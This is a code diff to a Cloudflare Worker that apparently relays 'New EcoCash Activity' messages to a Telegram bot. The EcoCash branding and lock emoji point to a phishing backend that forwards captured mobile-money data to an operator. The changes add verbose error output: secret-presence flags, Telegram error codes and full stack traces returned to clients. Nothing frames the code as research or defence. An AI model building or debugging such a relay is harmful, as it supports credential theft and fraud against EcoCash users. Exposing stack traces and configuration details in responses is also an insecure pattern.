@@ -11,8 +11,13 @@ export default {
         const botToken = env.TELEGRAM_BOT_TOKEN;
         const chatId = env.TELEGRAM_CHAT_ID;
 
+        // Detailed check for missing secrets
         if (!botToken || !chatId) {
-          return new Response(JSON.stringify({ error: "Secrets not configured" }), { status: 500 });
+          return new Response(JSON.stringify({ 
+            error: "Secrets not configured in Cloudflare", 
+            hasToken: !!botToken, 
+            hasChatId: !!chatId 
+          }), { status: 500, headers: { 'Content-Type': 'application/json' } });
         }
 
         let message = `🔐 *New EcoCash Activity*\n-------------------------------\n`;
@@ -41,14 +46,24 @@ export default {
         
         const tgData = await tgRes.json();
         
+        // Detailed check for Telegram API errors
         if (!tgData.ok) {
-          return new Response(JSON.stringify({ error: tgData.description }), { status: 400 });
+          return new Response(JSON.stringify({ 
+            error: tgData.description,
+            telegramCode: tgData.error_code
+          }), { status: 400, headers: { 'Content-Type': 'application/json' } });
         }
         
         return new Response(JSON.stringify({ success: true }), { status: 200 });
 
       } catch (e) {
-        return new Response(JSON.stringify({ error: e.message }), { status: 500 });
+        // Return the exact crash reason
+        return new Response(JSON.stringify({ 
+          error: e.message, 
+          stack: e.stack,
+          hasToken: !!env.TELEGRAM_BOT_TOKEN,
+          hasChatId: !!env.TELEGRAM_CHAT_ID
+        }), { status: 500, headers: { 'Content-Type': 'application/json' } });
       }
     }
 
